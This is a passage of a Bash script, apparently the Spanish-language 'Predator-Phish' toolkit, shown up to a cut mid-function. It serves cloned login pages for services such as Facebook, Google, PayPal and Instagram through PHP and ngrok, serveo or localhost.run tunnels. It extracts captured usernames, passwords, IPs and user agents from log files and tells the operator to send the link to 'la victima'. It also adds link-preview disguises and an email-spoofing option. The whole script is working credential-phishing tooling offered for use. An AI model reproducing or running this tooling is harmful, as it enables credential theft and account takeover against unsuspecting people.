#!/bin/bash
#colors
R='\e[1;31m'
G='\e[1;32m'
Y='\e[1;33m'
B='\e[1;34m'
M='\e[1;35m'
C='\e[1;36m'
W='\e[1;37m'
P='\e[1;35m'
Green='\e[32m'
Gr='\e[5m\e[32m'
Gris='\e[90m'

r="\e[1;91m"
g="\e[1;92m"
y="\e[1;93m"
w="\e[1;39m"
c="\e[1;96m"
b="\e[1;94m"
o="\e[1;33m"

error() { echo -e "\\033[1;31m[\033[1;36mPROCESO INTERRUMPIDO POR EL USUARIO\033[1;31m]\\033[1;32m  $*"; exit 1 ; }

stop() {
checkng=$(ps aux | grep -o "ngrok" | head -n1)
checkphp=$(ps aux | grep -o "php" | head -n1)
if [[ $checkng == *'ngrok'* ]]; then
pkill -f -2 ngrok > /dev/null 2>&1
killall -2 ngrok > /dev/null 2>&1
fi
if [[ $checkphp == *'php'* ]]; then
pkill -f -2 php > /dev/null 2>&1
killall -2 php > /dev/null 2>&1
fi
cd sites/$server
sed -i "/<meta property='og:.*' content='.*'/d" ./index.html
rm -rf images &> /dev/null
rm -rf users.txt
rm -rf ips.txt
}


trap 'printf "\n";stop;error;exit 1' 2

depen() {
printf "\e[1;92m"
command -v php > /dev/null 2>&1 || { echo -e >&2 "Requiero php. Por favor instalalo. Abortando... \e[0m"; sleep 2; exit 1; }
command -v curl > /dev/null 2>&1 || { echo -e >&2 "Requiero curl. Por favor instalalo. Abortando... \e[0m"; sleep 2; exit 1; }
command -v ngrok > /dev/null 2>&1 || { echo -e >&2 "Requiero ngrok. Por favor instalalo. Abortando... \e[0m"; sleep 2; exit 1; }
command -v ssh > /dev/null 2>&1 || { echo -e >&2 "Requiero openssh. Por favor instalalo. Abortando... \e[0m"; sleep 2; exit 1; }
}


banner() {
clear
echo -e $R"      ╔═══════════╗"
echo -e "$R    ╔═╝$W███████████$R╚═╗"
echo -e "$R   ╔╝$W███████████████$R╚╗"
echo -e "$R   ║$W█████\033[1;32mPr3dat0r\033[00m\033[1;37m████$R║"
echo -e "$R   ║$W█████████████████$R║    \e[1;36m•\e[1;31m◈\e[1;36m•▬ ▬ ▬ ▬ ▬ ▬ ▬•\e[1;31m◈\e[1;36m•▬ ▬ ▬ ▬ ▬ ▬ ▬•\e[1;31m◈\e[1;36m•. \e[00m\e[1;31m"
echo -e "$R   ║$W█████████████████$R║            \e[30;48;5;196m\e[1;32m\e[1;36m Predator\e[0m \e[30;48;5;39m\e[1;31m Phishing\e[0m\e[1;31m"
echo -e "$R   ║$W█$R╔$W█████████████$R╗$W█$R║    \e[1;36m•\e[1;31m◈\e[1;36m•▬ ▬ ▬ ▬ ▬ ▬ ▬•\e[1;31m◈\e[1;36m•▬ ▬ ▬ ▬ ▬ ▬ ▬•\e[1;31m◈\e[1;36m•. \e[00m\e[1;31m"
echo -e "$R   ╚╦╝$W███$Gr▒▒\e[0m$W███$Gr▒▒\e[0m$W███$R╚╦╝    "
echo -e "$R   ╔╝$W██$Gr▒▒▒▒\e[0m$W███$Gr▒▒▒▒\e[0m$W██$R╚╗     "
echo -e "$R   ║$W██$Gr▒▒▒▒▒\e[0m$W███$Gr▒▒▒▒▒\e[0m$W██$R|      "
echo -e "$R   ║$W██$Gr▒▒▒▒\e[0m$W█████$Gr▒▒▒▒\e[0m$W██$R║                               "
echo -e "$R   ╚╗$W███████████████$R╔╝"
echo -e "$R  ╔═╬══╦╝$W██$Gr▒\e[0m$W█$Gr▒\e[0m$W██$R╚╦══╝ $G.$g▒$G.."
echo -e "$R  ║$W█$R║══║$W█████████$R║ $G...$g▒$G."
echo -e "$R  ║$W█$R║══║$W█$R║$W██$R║$W██$R║$W█$R║　$G.$g▒$G.."
echo -e "$R  ║$W█$R║══╚═╩══╩╦═╩═╩═╦╗$g▒$G."
echo -e "$R ╔╝$W█$R╚══╦═╦══╦╩═╦═╦═╩╝"
echo -e "$R╔╝$W█████$R║$W█$R║$W██$R║$W██$R║$W█$R║"
echo -e "$R║$W██████$R║$W█████████$R║\033[00m"
echo
echo -e "\e[1;32mCode by: th3_pr3dat0r\e[0m"
sleep 0.1
}


if [ -d /etc/ ] ; then
  Distro='Distro basada en Debian'
elif [ -d /data/data/com.termux/ ] ; then
  Distro='Termux'
fi

menu() {
printf "\n"
printf "\e[0m\e[1;91m  ===========================================================\e[0m\n"
printf "      \e[1;91m[\e[0m\e[1;36m01\e[0m\e[1;91m]\e[0m\e[1;36m Redes Sociales\e[0m                    \e[1;91m[\e[0m\e[1;36m99\e[0m\e[1;91m]\e[0m\e[1;36m Salir\n"
printf "      \e[1;91m[\e[0m\e[1;36m02\e[0m\e[1;91m]\e[0m\e[1;36m Redes Sociales OTP \e[0m \n"
printf "      \e[1;91m[\e[0m\e[1;36m03\e[0m\e[1;91m]\e[0m\e[1;36m Páginas de Wifi    \n"
printf "      \e[1;91m[\e[0m\e[1;36m04\e[0m\e[1;91m]\e[0m\e[1;36m Cóctel thelinuxchoice    \n"
printf "      \e[1;91m[\e[0m\e[1;36m05\e[0m\e[1;91m]\e[0m\e[1;36m Enviar Email Spoofing    \n"
printf "\e[0m\e[1;91m  ===========================================================\e[0m\n"

read -p $'\n\e[41m\e[1;36mPredator-Phish>>\e[0m\e[1;32m \en' moption

if [[ $moption == 1 || $moption == 01 ]]; then
menu1
elif [[ $moption == 2 || $moption == 02 ]]; then
menu2
elif [[ $moption == 3 || $moption == 03 ]]; then
menu3
elif [[ $moption == 4 || $moption == 04 ]]; then
server="link"
coctel="link"
link="www.mylocationis.com"
start1
elif [[ $moption == 5 || $moption == 05 ]]; then
if [ "${Distro}" = "Distro basada en Debian" ]; then
    python3 predator-mailer.py
elif [ "${Distro}" = "Termux" ]; then
    python predator-mailer.py
else
echo -e "\e[1;32m Distro no soportada \e[00m\n"
fi
elif [[ $moption == 99 ]]; then
echo -e "\e[1;32m Goodbye :) \e[00m\n"
sleep 1
exit 1
else
printf "\e[1;91m [\e[1;96m!\e[1;91m]\e[1;96m Opcion no valida!\e[0m\n"
echo
sleep 1
exit 1
fi
}

menu1(){
banner
printf "\n"
echo -e "$r[$g 01$r ]$c Amazon               $r[$g 24$r ]$c Pinterest"
echo -e "$r[$g 02$r ]$c Apple                $r[$g 25$r ]$c PlayStation"
echo -e "$r[$g 03$r ]$c Adobe                $r[$g 26$r ]$c Protonmail"
echo -e "$r[$g 04$r ]$c Badoo                $r[$g 27$r ]$c Pornhub"
echo -e "$r[$g 05$r ]$c DeviantArt           $r[$g 28$r ]$c Primevideo"
echo -e "$r[$g 06$r ]$c eBay"
echo -e "$r[$g 07$r ]$c Foursquare"
echo -e "$r[$g 08$r ]$c Facebook"
echo -e "$r[$g 09$r ]$c Fake-Followers"
echo -e "$r[$g 10$r ]$c Google"
echo -e "$r[$g 11$r ]$c Github"
echo -e "$r[$g 12$r ]$c GitLab"
echo -e "$r[$g 13$r ]$c iCloud"
echo -e "$r[$g 14$r ]$c Imgur"
echo -e "$r[$g 15$r ]$c Instagram"
echo -e "$r[$g 16$r ]$c Linkedin"
echo -e "$r[$g 17$r ]$c Microsoft"
echo -e "$r[$g 18$r ]$c Microsoft Outlook"
echo -e "$r[$g 19$r ]$c MySpace"
echo -e "$r[$g 20$r ]$c Netflix"
echo -e "$r[$g 21$r ]$c Origin"
echo -e "$r[$g 22$r ]$c Paypal"
echo -e "$r[$g 23$r ]$c Post-Facebook"

read -p $'\n\e[41m\e[1;36mPredator-Phish>>\e[0m\e[1;32m \en' option

if [[ $option == 1 || $option == 01 ]]; then
server="amazon"
link="www.amazon.com"
start1
elif [[ $option == 2 || $option == 02 ]]; then
server="apple"
link="www.apple.com"
start1
elif [[ $option == 3 || $option == 03 ]]; then
server="adobe"
link="account.adobe.com"
start1
elif [[ $option == 4 || $option == 04 ]]; then
server="badoo"
link="badoo.com"
start1
elif [[ $option == 5 || $option == 05 ]]; then
list_deviant
elif [[ $option == 6 || $option == 06 ]]; then
server="ebay"
link="ec.ebay.com"
start1
elif [[ $option == 7 || $option == 07 ]]; then
server="foursquare"
link="es.foursquare.com"
start1
elif [[ $option == 8 || $option == 08 ]]; then
list_fb
elif [[ $option == 9 || $option == 09 ]]; then
server="pinterest"
link="#"
start1
elif [[ $option == 10 ]]; then
list_g
elif [[ $option == 11 ]]; then
server="yahoo"
start1
elif [[ $option == 12 ]]; then
list_gitlab
elif [[ $option == 13 ]]; then
server="icloud"
start1
elif [[ $option == 14 ]]; then
server="imgur"
start1
elif [[ $option == 15 ]]; then
list_ins
elif [[ $option == 16 ]]; then
server="linkedin"
start1
elif [[ $option == 17 ]]; then
server="microsoft"
start1
elif [[ $option == 18 ]]; then
server="outlook"
start1
elif [[ $option == 19 ]]; then
server="myspace"
start1
elif [[ $option == 20 ]]; then
server="netflix_all"
link="www.netflix.com"
start1
elif [[ $option == 21 ]]; then
server="origin"
link="signin.ea.com"
start1
elif [[ $option == 22 ]]; then
server="paypal"
start1
elif [[ $option == 23 ]]; then
list_post
elif [[ $option == 24 ]]; then
server="pinterest"
start1
elif [[ $option == 25 ]]; then
server="playstation"
start1
elif [[ $option == 26 ]]; then
server="protonmail"
start1
elif [[ $option == 27 ]]; then
list_porn
elif [[ $option == 28 ]]; then
server="primevideo"
start1
elif [[ $option == 99 ]]; then
exit 1

else
printf "\e[1;91m [\e[1;96m!\e[1;91m]\e[1;96m Opcion no valida!\e[0m\n"
sleep 2
exit 1
fi
}


list_fb(){
clear
banner
echo -e $bcolor
echo -e "
$r[$g*$r] $b Páginas de Facebook\n
$r[$g 01$r ]$c Facebook PC
$r[$g 02$r ]$c Facebook Mobile
$r[$g 03$r ]$c Facebook Seguridad
$r[$g 04$r ]$c Facebook Messenger
$r[$g 05$r ]$c Facebook Free Fire
$r[$g 06$r ]$c Facebook PUBG Lite
$r[$g 99$r ]$c Elegir otra página\n"
read -p $'\n\e[41m\e[1;36mPredator-Phish>>\e[0m\e[1;32m \en' opcfb
if [[ $opcfb == "1" || $opcfb == "01" ]];then
server="facebook_pc"
link="www.facebook.com"
start1
elif [[ $opcfb == "2" || $opcfb == "02" ]];then
server="facebook_mobile"
link="m.facebook.com"
start1
elif [[ $opcfb == "3" || $opcfb == "03" ]];then
server="alertadeseguridad"
link="www.facebook.com"
start1
elif [[ $opcfb == "4" || $opcfb == "04" ]];then
server="messenger"
link="www.facebook.com"
start1
elif [[ $opcfb == "5" || $opcfb == "05" ]];then
server="freefire"
link="www.facebook.com"
start1
elif [[ $opcfb == "6" || $opcfb == "06" ]];then
server="pubg-lite"
link="www.facebook.com"
start1
elif [[ $opcfb == "99" ]];then
menu1
else
printf "\e[1;91m [\e[1;96m!\e[1;91m]\e[1;96m Opcion no valida!\e[0m\n"
sleep 1
list_fb
fi
}


list_porn(){
clear
banner
echo -e $bcolor
echo -e "
$r[$g*$r] $y Páginas de Pornhub\n
$r[$g 01$r ]$c Pornhub PC
$r[$g 02$r ]$c Pornhub Mobile
$r[$g 99$r ]$c Elegir otra página\n"
read -p $'\n\e[41m\e[1;36mPredator-Phish>>\e[0m\e[1;32m \en' opcporn
if [[ $opcporn == "1" || $opcporn == "01" ]];then
server="pornhub_pc"
link="www.pornhub.com"
start1
elif [[ $opcporn == "2" || $opcporn == "02" ]];then
server="pornhub_mobile"
link="m.pornhub.com"
start1
elif [[ $opcporn == "99" ]];then
menu1
else
printf "\e[1;91m [\e[1;96m!\e[1;91m]\e[1;96m Opcion no valida!\e[0m\n"
sleep 1
list_porn
fi
}

list_post(){
clear
banner
echo -e $bcolor
echo -e "
$r[$g*$r] $y Páginas de Post de Facebook\n
$r[$g 01$r ]$c Mia Khalifa
$r[$g 02$r ]$c Lana Rhoades
$r[$g 99$r ]$c Elegir otra página\n"
read -p $'\n\e[41m\e[1;36mPredator-Phish>>\e[0m\e[1;32m \en' opcpost
if [[ $opcpost == "1" || $opcpost == "01" ]];then
server="fb_post_mia"
link="m.facebook.com"
start1
elif [[ $opcpost == "2" || $opcpost == "02" ]];then
server="fb_post_lana"
link="m.facebook.com"
start1
elif [[ $opcpost == "99" ]];then
menu1
else
printf "\e[1;91m [\e[1;96m!\e[1;91m]\e[1;96m Opcion no valida!\e[0m\n"
sleep 1
list_post
fi
}

list_ins(){
clear
banner
echo -e $bcolor
echo -e "
$r[$g*$r] $y Páginas de Instagram\n
$r[$g 01$r ]$c Instagram PC
$r[$g 02$r ]$c Instagram Mobile
$r[$g 03$r ]$c Profiles
$r[$g 99$r ]$c Elegir otra página\n"
read -p $'\n\e[41m\e[1;36mPredator-Phish>>\e[0m\e[1;32m \en' opcins
if [[ $opcins == "1" || $opcins == "01" ]];then
server="instagram_pc"
link="www.instagram.com"
start1
elif [[ $opcins == "2" || $opcins == "02" ]];then
server="instagram_mobile"
link="www.instagram.com"
start1
elif [[ $opcins == "3" || $opcins == "03" ]];then
list_pro
elif [[ $opcins == "99" ]];then
menu1
else
printf "\e[1;91m [\e[1;96m!\e[1;91m]\e[1;96m Opcion no valida!\e[0m\n"
sleep 1
list_ins
fi
}

list_pro(){
clear
banner
echo -e $bcolor
echo -e "
$r[$g*$r] $y Páginas\n
$r[$g 01$r ]$c Para PC
$r[$g 02$r ]$c Para Mobile
$r[$g 99$r ]$c Elegir otra página\n"
read -p $'\n\e[41m\e[1;36mPredator-Phish>>\e[0m\e[1;32m \en' opci
if [[ $opci == "1" || $opci == "01" ]];then
pro_pc
elif [[ $opci == "2" || $opci == "02" ]];then
pro_mobile
elif [[ $opci == "99" ]];then
menu1
else
printf "\e[1;91m [\e[1;96m!\e[1;91m]\e[1;96m Opcion no valida!\e[0m\n"
sleep 1
list_pro
fi
}

pro_pc(){
clear
banner
echo -e $bcolor
echo -e "
$r[$g*$r] $y Páginas PC\n
$r[$g 01$r ]$c Lana Rhoades
$r[$g 02$r ]$c Riley Reid
$r[$g 99$r ]$c Elegir otra página\n"
read -p $'\n\e[41m\e[1;36mPredator-Phish>>\e[0m\e[1;32m \en' opcprop
if [[ $opcprop == "1" || $opcprop == "01" ]];then
server="instagram_lana_pc"
link="www.instagram.com"
start1
elif [[ $opcprop == "2" || $opcprop == "02" ]];then
server="instagram_riley_pc"
link="www.instagram.com"
start1
elif [[ $opcprop == "99" ]];then
menu1
else
printf "\e[1;91m [\e[1;96m!\e[1;91m]\e[1;96m Opcion no valida!\e[0m\n"
sleep 1
pro_pc
fi
}

pro_mobile(){
clear
banner
echo -e $bcolor
echo -e "
$r[$g*$r] $y Páginas Mobile\n
$r[$g 01$r ]$c Lana Rhoades
$r[$g 02$r ]$c Riley Reid
$r[$g 99$r ]$c Elegir otra página\n"
read -p $'\n\e[41m\e[1;36mPredator-Phish>>\e[0m\e[1;32m \en' opcpro
if [[ $opcpro == "1" || $opcpro == "01" ]];then
server="instagram_lana_mobile"
link="www.instagram.com"
start1
elif [[ $opcpro == "2" || $opcpro == "02" ]];then
server="instagram_riley_mobile"
link="www.instagram.com"
start1
elif [[ $opcpro == "99" ]];then
menu1
else
printf "\e[1;91m [\e[1;96m!\e[1;91m]\e[1;96m Opcion no valida!\e[0m\n"
sleep 1
pro_mobile
fi
}

list_deviant(){
clear
banner
echo -e $bcolor
echo -e "
$r[$g*$r] $g Páginas\n
$r[$g 01$r ]$c Deviantart PC
$r[$g 02$r ]$c Deviantart Mobile
$r[$g 99$r ]$c Elegir otra página\n"
read -p $'\n\e[41m\e[1;36mPredator-Phish>>\e[0m\e[1;32m \en' opcd
if [[ $opcd == "1" || $opcd == "01" ]];then
server="deviantart_pc"
link="www.deviantart.com"
start1
elif [[ $opcd == "2" || $opcd == "02" ]];then
server="deviantart_mobile"
link="www.deviantart.com"
start1
elif [[ $opcd == "99" ]];then
menu1
else
printf "\e[1;91m [\e[1;96m!\e[1;91m]\e[1;96m Opcion no valida!\e[0m\n"
sleep 1
list_deviant
fi
}

list_g(){
clear
banner
echo -e $bcolor
echo -e "
$r[$g*$r] $y Páginas\n
$r[$g 01$r ]$c Google PC
$r[$g 02$r ]$c Google Mobile
$r[$g 99$r ]$c Elegir otra página\n"
read -p $'\n\e[41m\e[1;36mPredator-Phish>>\e[0m\e[1;32m \en' opg
if [[ $opg == "1" || $opg == "01" ]];then
server="google_pc"
link="www.google.com"
start1
elif [[ $opg == "2" || $opg == "02" ]];then
list_gm
elif [[ $opg == "99" ]];then
menu1
else
printf "\e[1;91m [\e[1;96m!\e[1;91m]\e[1;96m Opcion no valida!\e[0m\n"
sleep 1
list_g
fi
}

list_gm(){
clear
banner
echo -e $bcolor
echo -e "
$r[$g*$r] $y Páginas\n
$r[$g 01$r ]$c Google Mobile
$r[$g 02$r ]$c Google Mobile 2
$r[$g 99$r ]$c Elegir otra página\n"
read -p $'\n\e[41m\e[1;36mPredator-Phish>>\e[0m\e[1;32m \en' opgm
if [[ $opgm == "1" || $opgm == "01" ]];then
server="google_mobile"
link="www.google.com"
start1
elif [[ $opgm == "2" || $opgm == "02" ]];then
server="google_mobile2"
link="www.google.com"
start1
elif [[ $opgm == "99" ]];then
menu1
else
printf "\e[1;91m [\e[1;96m!\e[1;91m]\e[1;96m Opcion no valida!\e[0m\n"
sleep 1
list_gm
fi
}

start1() {
if [[ -e sendlink ]]; then
rm -rf sendlink
fi
clear
banner
printf "\n"
printf "\e[1;93m\e[0m\e[1;92mPuedes escojer para el reenvio de puertos una de las opciones\e[0m \e[1;93m\e[0m\n"
printf "\n"
printf "\e[0m\e[1;91m======================================\e[0m \e[1;93m\e[0m\n"
printf "\e[1;91m[\e[0m\e[1;36m01\e[0m\e[1;91m]\e[0m\e[1;96m Localhost.run\e[0m\n"
printf "\e[1;91m[\e[0m\e[1;36m02\e[0m\e[1;91m]\e[0m\e[1;96m Serveo.net\e[0m\n"
printf "\e[1;91m[\e[0m\e[1;36m03\e[0m\e[1;91m]\e[0m\e[1;96m Ngrok\e[0m\n"
printf "\e[0m\e[1;91m======================================\e[0m \e[1;93m\e[0m\n"
default_option_server="1"

read -p $'\n\e[41m\e[1;36mPredator-Phish>>\e[0m\e[1;32m \en' option_server

option_server="${option_server:-${default_option_server}}"
if [[ $option_server == 1 || $option_server == 01 ]]; then
run="predator"
localrun
elif [[ $option_server == 2 || $option_server == 02 ]]; then
serveo
elif [[ $option_server == 3 || $option_server == 03 ]]; then
ngrok_s
else
printf "\e[1;91m [\e[1;96m!\e[1;91m]\e[1;96m Opcion no valida!\e[0m\n"
sleep 1
clear
start1
fi
}


localrun(){
default_port=3333 #$(seq 1111 4444 | sort -R | head -n1)
printf '\n\e[1;91m[\e[0m\e[1;96m*\e[0m\e[1;91m]\e[1;96m Escoger un puerto (Default:\e[0m\e[1;77m %s \e[1;96m)\e[1;92m: \e[0m' $default_port
read port
port="${port:-${default_port}}"
sleep 4
printf "\e[1;91m[\e[0m\e[1;96m*\e[0m\e[1;91m]\e[1;96m Listo!\e[0m\n"
sleep 4
if [[ $coctel == link ]]; then
localrunC
else
tags
fi
}

localrunx(){
printf "\e[1;91m[\e[1;96m*\e[1;91m]\e[1;96m Comenzando servidor PHP...\n"
cd sites/$server && php -S 127.0.0.1:$port > /dev/null 2>&1 &
sleep 5
printf "\e[1;91m[\e[0m\e[1;96m*\e[0m\e[1;91m]\e[1;96m Por favor abre otra ventana y ejecuta:\e[0m\n"
printf "$W ssh -R 80:localhost:$port $link@ssh.localhost.run\e[0m\n"
if [[ -e sendlink ]]; then
rm -rf sendlink
fi
printf "\n"
checkfound
}

localrunC(){
printf "\e[1;91m[\e[1;96m*\e[1;91m]\e[1;96m Comenzando servidor PHP...\n"
cd sites/$server && php -S 127.0.0.1:$port > /dev/null 2>&1 &
sleep 5
printf "\e[1;91m[\e[0m\e[1;96m*\e[0m\e[1;91m]\e[1;96m Por favor abre otra ventana y ejecuta:\e[0m\n"
printf "$W ssh -R 80:localhost:$port $link@ssh.localhost.run\e[0m\n"
printf "\e[1;91m[\e[0m\e[1;96m*\e[0m\e[1;91m]\e[1;96m Revisa los datos poniendo al final del link:\e[1;92m /haber.php\e[0m\n"
while [ true ]; do
if [[ -e "sites/$server/info.txt" ]]; then
printf "\n\e[1;91m[\e[0m\e[1;96m*\e[0m\e[1;91m]\e[1;96m Esperando datos, Presiona Ctrl + C para salir...\e[0m\n"
fi
sleep 3600
done
}

serveo() {
default_port="3333" #$(seq 1111 4444 | sort -R | head -n1)
printf '\n'
printf '\e[1;91m[\e[0m\e[1;96m*\e[0m\e[1;91m]\e[1;96m Escoger un puerto (Default:\e[0m\e[1;77m %s \e[1;96m)\e[1;92m: \e[0m' $default_port
read port
port="${port:-${default_port}}"
serverx
}

serverx() {
printf "\e[1;91m[\e[1;96m*\e[1;91m]\e[1;96m Comenzando servidor PHP...\n"
cd sites/$server && php -S 127.0.0.1:$port > /dev/null 2>&1 &
sleep 2
printf "\e[1;91m[\e[0m\e[1;96m*\e[0m\e[1;91m]\e[1;96m Comenzando servidor ssh...\e[0m\n"
if [[ -e sendlink ]]; then
rm -rf sendlink
fi
$(which sh) -c 'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:localhost:'$port' serveo.net 2> /dev/null > sendlink ' &
printf "\n"
sleep 10
send_link=$(grep -o "https://[0-9a-z]*\.serveo.net" sendlink)
if [[ $coctel == link ]]; then
catch_coctel
else
tags
fi
}

ngrok_s() {
default_port="3333" #$(seq 1111 4444 | sort -R | head -n1)
printf '\n'
printf '\e[1;91m[\e[0m\e[1;96m*\e[0m\e[1;91m]\e[1;96m Escoger un puerto (Default:\e[0m\e[1;77m %s \e[1;96m)\e[1;92m: \e[0m' $default_port
read port
port="${port:-${default_port}}"
ngrok_x
}

ngrok_x() {
printf "\e[1;91m[\e[1;96m*\e[1;91m]\e[1;96m Comenzando servidor PHP...\n"
cd sites/$server && php -S 127.0.0.1:$port > /dev/null 2>&1 &
sleep 2
printf "\e[1;91m[\e[0m\e[1;96m*\e[0m\e[1;91m]\e[1;96m Comenzando servidor ngrok...\e[0m\n"
ngrok http $port > /dev/null 2>&1 &
sleep 10
printf "\e[1;91m[\e[0m\e[1;96m*\e[0m\e[1;91m]\e[1;96m Listo!\e[0m\n"
sleep 4
send_link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
if [[ $coctel == link ]]; then
catch_coctel
else
tags
fi
}


ip_s() {
ip=$(grep -o 'IP:.*' sites/$server/ips.txt | cut -d ":" -f2)
IFS=$'\n'
agent=$(grep -o 'User-Agent:.*' sites/$server/ips.txt | cut -d ":" -f2)
printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m]\e[0m\e[1;92m IP:\e[0m\e[1;77m %s\n\e[0m" $ip
printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m]\e[0m\e[1;92m User-Agent:\e[0m\e[1;77m %s\n\e[0m" $agent
printf "\n"
cat sites/$server/ips.txt >> sites/$server/usernames.txt
rm -rf sites/$server/ips.txt
}


catch_cred() {
account=$(grep -o 'Account:.*' sites/$server/users.txt | cut -d " " -f2)
IFS=$'\n'
password=$(grep -o 'Pass:.*' sites/$server/users.txt | cut -d ":" -f2)
printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m]\e[0m\e[1;92m Account:\e[0m\e[1;77m %s\n\e[0m" $account
printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m]\e[0m\e[1;92m Password:\e[0m\e[1;77m %s\n\e[0m" $password
printf "\n"
printf "\e[1;91m[\e[0m\e[1;36m*\e[0m\e[1;91m]\e[1;96m Saved:\e[0m\e[1;77m sites/%s/usernames.txt\e[0m\n" $server
printf "\n"
printf "\e[1;91m[\e[0m\e[1;36m*\e[0m\e[1;91m]\e[1;96m Esperando credenciales, Presiona Ctrl + C para salir...\e[0m\n"

}

catch_coctel() {
while [ true ]; do
if [[ -e "sites/$server/info.txt" ]]; then
clear
printf "\n"
printf "\n\e[1;91m[\e[1;96m*\e[1;91m]\e[1;96m Envia este link a la victima:\e[0m\e[1;77m %s\e[0m\n" $send_link
printf "\n"
printf "\e[1;91m[\e[0m\e[1;36m*\e[0m\e[1;91m]\e[1;96m Saved:\e[0m\n $send_link/haber.php"
printf "\n"
printf "\n\e[1;91m[\e[0m\e[1;36m*\e[0m\e[1;91m]\e[1;96m Esperando datos, Presiona Ctrl + C para salir...\e[0m\n"
fi
sleep 3600
done
}


ip_s2() {
ip=$(grep -o 'IP:.*' ips.txt | cut -d ":" -f2)
IFS=$'\n'
agent=$(grep -o 'User-Agent:.*' ips.txt | cut -d ":" -f2)
printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m]\e[0m\e[1;92m IP:\e[0m\e[1;77m %s\n\e[0m" $ip
printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m]\e[0m\e[1;92m User-Agent:\e[0m\e[1;77m %s\n\e[0m" $agent
printf "\n"
cat ips.txt >> usernames.txt
rm -rf ips.txt
}


catch_cred2() {
account=$(grep -o 'Account:.*' users.txt | cut -d " " -f2)
IFS=$'\n'
password=$(grep -o 'Pass:.*' users.txt | cut -d ":" -f2)
printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m]\e[0m\e[1;92m Account:\e[0m\e[1;77m %s\n\e[0m" $account
printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m]\e[0m\e[1;92m Password:\e[0m\e[1;77m %s\n\e[0m" $password
printf "\n"
printf "\e[1;91m[\e[0m\e[1;36m*\e[0m\e[1;91m]\e[1;96m Saved:\e[0m\e[1;77m sites/%s/usernames.txt\e[0m\n" $server
printf "\n"
printf "\e[1;91m[\e[0m\e[1;36m*\e[0m\e[1;91m]\e[1;96m Esperando credenciales, Presiona Ctrl + C para salir...\e[0m\n"

}


menu_add(){

if [[ $tag1 == "1" ]];then
echo -e "\e[1;91m[\e[1;92m*\e[1;91m]\e[1;96m Título:$g $title"
fi
if [[ $tag2 == "2" ]];then
echo -e "\e[1;91m[\e[1;92m*\e[1;91m]\e[1;96m Imagen:$g $ruta"
fi
if [[ $tag3 == "3" ]];then
echo -e "\e[1;91m[\e[1;92m*\e[1;91m]\e[1;96m Descripción:$g $text"
fi
if [[ $tag4 == "4" ]];then
echo -e "\e[1;91m[\e[1;92m*\e[1;91m]\e[1;96m Mini URL:$g $url2"
fi
if [[ $tag5 == "5" ]];then
echo -e "\e[1;91m[\e[1;92m*\e[1;91m]\e[1;96m Redireccionar:$g $link3"
fi
if [[ $tag6 == "6" ]];then
echo -e "\e[1;91m[\e[1;92m*\e[1;91m]\e[1;96m Imagen de URL:$g $link2"
fi
if [[ $tag7 == "7" ]];then
echo -e "\e[1;91m[\e[1;92m*\e[1;91m]\e[1;96m Nombre para Telegram:$g $site_name"
fi
}

menu_tags(){
clear
banner
echo
menu_add
printf "\n"
printf "\e[1;93m\e[0m\e[1;92mWeb: $server\e[0m \e[1;93m\e[0m\n"
echo
echo -e "\e[1;91m[\e[1;92m*\e[1;91m]\e[1;96m Opciones extras:"
echo
echo -e "\e[1;91m[\e[1;92m1\e[1;91m]\e[1;96m Poner título"
echo -e "\e[1;91m[\e[1;92m2\e[1;91m]\e[1;96m Poner imagen"
echo -e "\e[1;91m[\e[1;92m3\e[1;91m]\e[1;96m Poner descripción"
echo -e "\e[1;91m[\e[1;92m4\e[1;91m]\e[1;96m Poner mini URL"
echo -e "\e[1;91m[\e[1;92m5\e[1;91m]\e[1;96m Redireccionado personalizado"
echo -e "\e[1;91m[\e[1;92m6\e[1;91m]\e[1;96m Poner imagen de una URL"
echo -e "\e[1;91m[\e[1;92m7\e[1;91m]\e[1;96m Poner un nombre a la web (Telegram)"
echo -e "\e[1;91m[\e[1;92m*\e[1;91m]\e[1;96m Para iniciar escribe: \e[1;92mrun\n"
}

tags(){
menu_tags
read -p $'\n\e[41m\e[1;36mPredator-Phish>>\e[0m\e[1;32m \en' addopc

if [[ $addopc == "1" || $addopc == "01" ]];then
read -p $'\e[1;31m[\e[1;32m*\e[1;31m]\e[1;36m Escribe el titulo\e[1;39m > ' title

if [[ $title == "" ]];then
echo -e "\n\e[1;31m[\e[1;32m*\e[1;31m]\e[1;36m No escribiste el titulo"
sleep 3
tags
else
tag1=1
show_title
tags
fi

elif [[ $addopc == "2" || $addopc == "02" ]];then
read -p $'\e[1;31m[\e[1;32m*\e[1;31m]\e[1;36m Escribe la ruta de la imagen\e[1;39m > ' ruta

if [[ $ruta == "" ]];then
echo -e "\n\e[1;31m[\e[1;32m*\e[1;31m]\e[1;36m No escribiste la ruta :b"
sleep 3
tags
else
if [[ -f $ruta ]];then
tag2=2
show_photo
tags
else
echo -e "\n\e[1;31m[\e[1;32m*\e[1;31m]\e[1;36m La imagen no existe :b"
sleep 3
tags
fi
fi

elif [[ $addopc == "3" || $addopc == "03" ]];then
read -p $'\e[1;31m[\e[1;32m*\e[1;31m]\e[1;36m Escribe la descripción\e[1;39m > ' text

if [[ $text == "" ]];then
echo -e "\n\e[1;31m[\e[1;32m*\e[1;31m]\e[1;36m No escribiste la descripción :b"
sleep 3
tags
else
tag3=3
show_text
tags
fi


elif [[ $addopc == "4" || $addopc == "04" ]];then
read -p $'\e[1;31m[\e[1;32m*\e[1;31m]\e[1;36m Escribe la url(sin:http/https)\e[1;39m> ' url2

if [[ $url2 == "" ]];then
echo -e "\n\e[1;31m[\e[1;32m*\e[1;31m]\e[1;36m No escribiste la URL :b"
sleep 3
tags
else
tag4=4
show_url
tags
fi

elif [[ $addopc == "5" || $addopc == "05" ]];then
fake

elif [[ $addopc == "6" || $addopc == "06" ]];then
read -p $'\e[1;31m[\e[1;32m*\e[1;31m]\e[1;36m Escribe la URL completa de la imagen\e[1;39m > ' link2

if [[ $link2 == "" ]];then
